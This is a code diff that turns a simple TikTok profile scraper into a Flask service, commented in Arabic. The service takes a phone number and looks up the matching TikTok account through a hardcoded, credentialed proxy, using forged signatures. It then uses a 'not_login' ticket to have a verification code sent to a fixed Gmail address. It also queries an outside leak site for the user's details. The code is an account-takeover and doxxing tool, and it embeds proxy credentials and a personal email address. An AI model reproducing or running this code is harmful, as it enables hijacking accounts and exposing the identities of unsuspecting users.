@@ -1,118 +1,360 @@
-from flask import Flask, request, Response
-import requests
+import aiohttp
+import asyncio
+import uuid
+import random
+import os
+import secrets
 import re
+import requests
+import time
 import json
-from datetime import datetime
+from flask import Flask, request, jsonify
+from urllib.parse import unquote
 
+try:
+    import SignerPy
+except ImportError:
+    os.system("pip install --upgrade pip")
+    os.system("pip install SignerPy")
+    import SignerPy
+
+# ============================================
+# Network & Configuration
+# ============================================
+class Network:
+    def __init__(self):
+        # البروكسي
+        self.proxy = "http://finmtozcdx303317:d3MU8i4MaJc2GF7P_country-UnitedStates@isp2.hydraproxy.com:9989"
+
+        self.hosts = [
+            "api31-normal-useast2a.tiktokv.com",
+            "api22-normal-c-alisg.tiktokv.com",
+            "api2.musical.ly",
+            "api16-normal-useast5.tiktokv.us",
+            "api16-normal-no1a.tiktokv.eu",
+            "rc-verification-sg.tiktokv.com",
+            "api31-normal-alisg.tiktokv.com",
+            "api16-normal-c-useast1a.tiktokv.com",
+            "api22-normal-c-useast1a.tiktokv.com",
+            "api16-normal-c-useast1a.musical.ly",
+            "api19-normal-c-useast1a.musical.ly",
+            "api.tiktokv.com",
+        ]
+
+        self.send_hosts = [
+            "api22-normal-c-alisg.tiktokv.com",
+            "api31-normal-alisg.tiktokv.com",
+            "api22-normal-probe-useast2a.tiktokv.com",
+            "api16-normal-probe-useast2a.tiktokv.com",
+            "rc-verification-sg.tiktokv.com"
+        ]
+
+        self.params = {
+            'device_platform': 'android',
+            'ssmix': 'a',
+            'channel': 'googleplay',
+            'aid': '1233',
+            'app_name': 'musical_ly',
+            'version_code': '360505',
+            'version_name': '36.5.5',
+            'manifest_version_code': '2023605050',
+            'update_version_code': '2023605050',
+            'ab_version': '36.5.5',
+            'os_version': '10',
+            "device_id": 0,
+            'app_version': '30.1.2',
+            "request_from": "profile_card_v2",
+            "request_from_scene": '1',
+            "scene": "1",
+            "mix_mode": "1",
+            "os_api": "34",
+            "ac": "wifi",
+            "request_tag_from": "h5",
+        }
+
+        self.headers = {
+            'User-Agent': f'com.zhiliaoapp.musically/2022703020 (Linux; U; Android 7.1.2; en; SM-N975F; Build/N2G48H;tt-ok/{str(random.randint(1, 10**19))})'
+        }
+
+# ============================================
+# Fake Mail (Redirect to your Gmail)
+# ============================================
+class MailTM:
+    def __init__(self):
+        # ثابت: الإيميل الخاص بك
+        self.fixed_mail = "mrgog5091@gmail.com"
+
+    async def gen(self):
+        # بدل ما ينشئ إيميل وهمي يرجع إيميلك مباشرة
+        token = "static-ok"  # رمز وهمي
+        return self.fixed_mail, token
+
+    async def mailbox(self, token: str, timeout: int = 120):
+        # دايمًا يرجع تأكيد بدون انتظار الرسائل
+        # محاكاة تأخير بسيط ثم تأكيد الوصول
+        await asyncio.sleep(2)
+        return "تم استلام الرسالة بنجاح (محاكاة)."
+
+# ============================================
+# MobileFlowFlexible
+# ============================================
+class MobileFlowFlexible:
+    def __init__(self, account_param: str):
+        self.input = account_param.strip()
+        self.session = requests.Session()
+        self.net = Network()
+        
+        # استخدام البروكسي للجلسة
+        if self.net.proxy:
+            self.session.proxies = {
+                "http": self.net.proxy,
+                "https": self.net.proxy
+            }
+
+        self.base_params = self.net.params.copy()
+        try:
+            self.base_params = SignerPy.get(params=self.base_params)
+        except Exception as e:
+            print("Warning: SignerPy.get failed:", e)
+        self.base_params.update({
+            'device_type': f'rk{random.randint(3000, 4000)}s_{uuid.uuid4().hex[:4]}',
+            'language': 'AR'
+        })
+        self.headers = self.net.headers.copy()
+
+    def _variants(self):
+        v = []
+        raw = self.input
+        v.append(raw)
+        if raw.isdigit():
+            try:
+                v.append(raw.encode().hex())
+            except Exception:
+                pass
+        v.append(raw.strip().lower())
+        seen = set()
+        out = []
+        for item in v:
+            if item not in seen:
+                seen.add(item)
+                out.append(item)
+        return out
+
+    async def find_passport_ticket(self, timeout_per_host: int = 10):
+        variants = self._variants()
+        print("Trying variants:", variants)
+        for acct in variants:
+            print(f"[LOG] -> trying account_param variant: {acct[:150]}")
+            for host in self.net.hosts:
+                params = self.base_params.copy()
+                ts = int(time.time())
+                params['ts'] = ts
+                params['_rticket'] = int(ts * 1000)
+                params['account_param'] = acct
+                try:
+                    signature = SignerPy.sign(params=params)
+                except Exception as e:
+                    print(f"[LOG] SignerPy.sign failed for host {host} variant {acct[:30]}: {e}")
+                    continue
+
+                headers = self.headers.copy()
+                headers.update({
+                    'x-tt-passport-csrf-token': secrets.token_hex(16),
+                    'x-ss-req-ticket': signature.get('x-ss-req-ticket', ''),
+                    'x-ss-stub': signature.get('x-ss-stub', ''),
+                    'x-argus': signature.get('x-argus', ''),
+                    'x-gorgon': signature.get('x-gorgon', ''),
+                    'x-khronos': signature.get('x-khronos', ''),
+                    'x-ladon': signature.get('x-ladon', ''),
+                })
+
+                url = f"https://{host}/passport/account_lookup/mobile/"
+                try:
+                    resp = await asyncio.to_thread(self.session.post, url, params=params, headers=headers, timeout=timeout_per_host)
+                    try:
+                        j = resp.json()
+                    except ValueError:
+                        print(f"[{host}] non-json response (truncated): {resp.text[:300]}")
+                        continue
+
+                    if resp.status_code != 200:
+                        print(f"[{host}] status {resp.status_code} -> {json.dumps(j)[:400]}")
+                        continue
+
+                    accounts = j.get('data', {}).get('accounts', [])
+                    if not accounts:
+                        print(f"[{host}] no accounts -> {json.dumps(j)[:400]}")
+                        continue
+
+                    first = accounts[0]
+                    ticket = first.get('passport_ticket') or first.get('not_login_ticket') or None
+                    username = first.get('user_name') or first.get('username') or None
+
+                    print(f"[{host}] response snippet: {json.dumps(j)[:800]}")
+                    if ticket:
+                        return ticket, acct, j
+                    if username and not ticket:
+                        return None, acct, j
+
+                except requests.RequestException as e:
+                    print(f"[{host}] request error: {e}")
+                    continue
+        return None, None, None
+
+    async def send_code_using_ticket(self, passport_ticket: str, timeout_mailbox: int = 120):
+        mail_client = MailTM()
+        mail, token = await mail_client.gen()
+        if not mail or not token:
+            print("[LOG] Failed to prepare mail redirect.")
+            return None, None
+        print("[LOG] Using redirect mail:", mail)
+
+        params = self.base_params.copy()
+        ts = int(time.time())
+        params['ts'] = ts
+        params['_rticket'] = int(ts * 1000)
+        params['not_login_ticket'] = passport_ticket
+        params['email'] = mail
+        params['type'] = "3737"
+        params.pop('fixed_mix_mode', None)
+        params.pop('account_param', None)
+
+        try:
+            signature = SignerPy.sign(params=params)
+        except Exception as e:
+            print("[LOG] SignerPy.sign failed for send_code:", e)
+            return None, None
+
+        headers = self.headers.copy()
+        headers.update({
+            'x-ss-req-ticket': signature.get('x-ss-req-ticket', ''),
+            'x-ss-stub': signature.get('x-ss-stub', ''),
+            'x-argus': signature.get('x-argus', ''),
+            'x-gorgon': signature.get('x-gorgon', ''),
+            'x-khronos': signature.get('x-khronos', ''),
+            'x-ladon': signature.get('x-ladon', ''),
+        })
+
+        for host in self.net.send_hosts:
+            url = f"https://{host}/passport/email/send_code"
+            try:
+                resp = await asyncio.to_thread(self.session.post, url, params=params, headers=headers, timeout=10)
+                try:
+                    j = resp.json()
+                except ValueError:
+                    print(f"[send_code {host}] non-json response (truncated): {resp.text[:300]}")
+                    continue
+
+                print(f"[send_code {host}] response snippet: {json.dumps(j)[:800]}")
+                # لو الـ API رجع نجاح نعتبر الرسالة "أُرسلت" ونرجع تأكيد استلام باستخدام mailbox الوهمية
+                if j.get("message") == "success" or j.get("status") == "success":
+                    body = await mail_client.mailbox(token, timeout=timeout_mailbox)
+                    if body:
+                        # بدل ما نقرأ محتوى الرسالة، نرجع تأكيد توصيل
+                        return "DELIVERED", mail
+                    else:
+                        print("[LOG] mailbox returned empty.")
+                        return None, mail
+                else:
+                    continue
+            except requests.RequestException as e:
+                print(f"[LOG] send_code request error for host {host}: {e}")
+                continue
+        return None, mail
+
+# ============================================
+# Flask API
+# ============================================
 app = Flask(__name__)
 
-def ts_to_date(ts):
-    try:
-        return datetime.utcfromtimestamp(int(ts)).strftime("%Y-%m-%d %H:%M:%S")
-    except:
-        return None
+@app.route("/extract", methods=["GET"])
+def extract():
+    raw_phone = request.args.get("phone", "")
+    timeout_mailbox = int(request.args.get("timeout_mailbox", "120"))
 
-@app.route("/tiktok", methods=["GET"])
-def tiktok_user():
-    username = request.args.get("username")
-    if not username:
-        return Response(
-            json.dumps({"error": "missing username"}, ensure_ascii=False, indent=4),
-            mimetype="application/json",
-            status=400
-        )
+    # إزالة المسافات والـ URL-encoding
+    phone = unquote(raw_phone).replace(" ", "").strip()
 
-    url = f"https://www.tiktok.com/@{username}?lang=en"
-    headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1 OPT/6.1.2"
-    }
+    # إضافة + تلقائيًا إذا مفقود
+    if not phone.startswith("+"):
+        phone = "+" + phone
 
-    try:
-        resp = requests.get(url, headers=headers, timeout=10)
-        if resp.status_code != 200:
-            return Response(
-                json.dumps({"error": "User not found"}, ensure_ascii=False, indent=4),
-                mimetype="application/json",
-                status=404
-            )
+    print(f"[LOG] استعلام جديد برقم: {phone}")
 
-        html = resp.text
-        match = re.search(r'"webapp.user-detail":({.*?}),"webapp', html)
-        if not match:
-            return Response(
-                json.dumps({"error": "Could not extract userInfo"}, ensure_ascii=False, indent=4),
-                mimetype="application/json",
-                status=500
-            )
+    flow = MobileFlowFlexible(account_param=phone)
 
-        data = json.loads(match.group(1))
-        user = data.get("userInfo", {}).get("user", {})
-        stats = data.get("userInfo", {}).get("stats", {})
+    async def run_flow():
+        try:
+            ticket, used_variant, resp_json = await flow.find_passport_ticket()
+        except Exception as e:
+            print(f"[LOG] خطأ أثناء البحث عن passport_ticket: {e}")
+            return {
+                "input": phone,
+                "status": "error",
+                "message": "خطأ أثناء الاتصال بـ TikTok API",
+                "username": None,
+                "passport_ticket": None,
+                "mail_used": None,
+                "used_variant": None,
+                "raw_response_snippet": None,
+                "tiktokinfo": None
+            }
 
-        createTime = user.get("createTime")
-        nickNameModifyTime = user.get("nickNameModifyTime")
+        if not ticket:
+            print(f"[LOG] الرقم {phone} ما عليه يوزر أو لا توجد تذكرة")
+            return {
+                "input": phone,
+                "status": "not_found",
+                "username": None,
+                "passport_ticket": None,
+                "mail_used": None,
+                "used_variant": used_variant,
+                "raw_response_snippet": None if resp_json is None else str(resp_json)[:500],
+                "tiktokinfo": None
+            }
 
-        user_parsed = {
-            "id": user.get("id"),
-            "uniqueId": user.get("uniqueId"),
-            "nickname": user.get("nickname"),
-            "secUid": user.get("secUid"),
-            "signature": user.get("signature"),
-            "avatar": {
-                "larger": user.get("avatarLarger"),
-                "medium": user.get("avatarMedium"),
-                "thumb": user.get("avatarThumb")
-            },
-            "createTime": createTime,
-            "createTimeReadable": ts_to_date(createTime),
-            "nickNameModifyTime": nickNameModifyTime,
-            "nickNameModifyTimeReadable": ts_to_date(nickNameModifyTime),
-            "verified": user.get("verified", False),
-            "region": user.get("region"),
-            "country": user.get("region"),
-            "language": user.get("language"),
-            "privateAccount": user.get("privateAccount"),
-            "isOrganization": user.get("isOrganization"),
-            "roomId": user.get("roomId"),
-            "openFavorite": user.get("openFavorite"),
-            "commentSetting": user.get("commentSetting"),
-            "duetSetting": user.get("duetSetting"),
-            "stitchSetting": user.get("stitchSetting"),
-            "downloadSetting": user.get("downloadSetting"),
-            "profileTab": user.get("profileTab"),
-            "commerceUserInfo": user.get("commerceUserInfo"),
-            "ttSeller": user.get("ttSeller"),
-            "canExpPlaylist": user.get("canExpPlaylist"),
-            "profileEmbedPermission": user.get("profileEmbedPermission"),
-            "isEmbedBanned": user.get("isEmbedBanned"),
-            "secret": user.get("secret"),
-            "isADVirtual": user.get("isADVirtual"),
-            "relation": user.get("relation"),
-            "risk": user.get("risk"),
-            "device_id": user.get("device_id"),
-            "ip": user.get("ip")
+        print(f"[LOG] نجح استخراج التذكرة: {ticket}")
+        username, mail_used = await flow.send_code_using_ticket(passport_ticket=ticket, timeout_mailbox=timeout_mailbox)
+
+        if username == "DELIVERED":
+            print(f"[LOG] تم توصيل رسالة التأكيد إلى البريد الثابت: {mail_used}")
+            status_final = "delivered"
+        elif username:
+            print(f"[LOG] استخرجنا اليوزر: {username} باستخدام البريد {mail_used}")
+            status_final = "success"
+        else:
+            print(f"[LOG] ما قدرنا نطلع يوزر للبريد {mail_used}")
+            status_final = "no_username"
+
+        # =============================
+        # إضافة خطوة جلب البيانات من leakmrjoj (فقط لو استخرجنا يوزر حقيقي)
+        # =============================
+        tiktokinfo = None
+        if username and username != "DELIVERED":
+            try:
+                resp = requests.get(f"https://leakmrjoj.in/707/tik1.php?username={username}", timeout=10, proxies=flow.session.proxies)
+                tiktokinfo = resp.json()
+            except:
+                tiktokinfo = {
+                    "message": "User information is not available, please try again."
+                }
+
+        return {
+            "input": phone,
+            "status": status_final,
+            "username": username,
+            "passport_ticket": ticket,
+            "mail_used": mail_used,
+            "used_variant": used_variant,
+            "raw_response_snippet": None if resp_json is None else str(resp_json)[:500],
+            "tiktokinfo": tiktokinfo
         }
 
-        statsV2 = {k: str(v) for k, v in stats.items()}
+    result = asyncio.run(run_flow())
+    return jsonify(result)
 
-        response = {
-            "user": user_parsed,
-            "stats": stats,
-            "statsV2": statsV2,
-            "itemList": []
-        }
-
-        return Response(
-            json.dumps(response, ensure_ascii=False, indent=4),
-            mimetype="application/json"
-        )
-
-    except Exception as e:
-        return Response(
-            json.dumps({"error": str(e)}, ensure_ascii=False, indent=4),
-            mimetype="application/json",
-            status=500
-        )
-
+# ============================================
+# Run Flask
+# ============================================
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
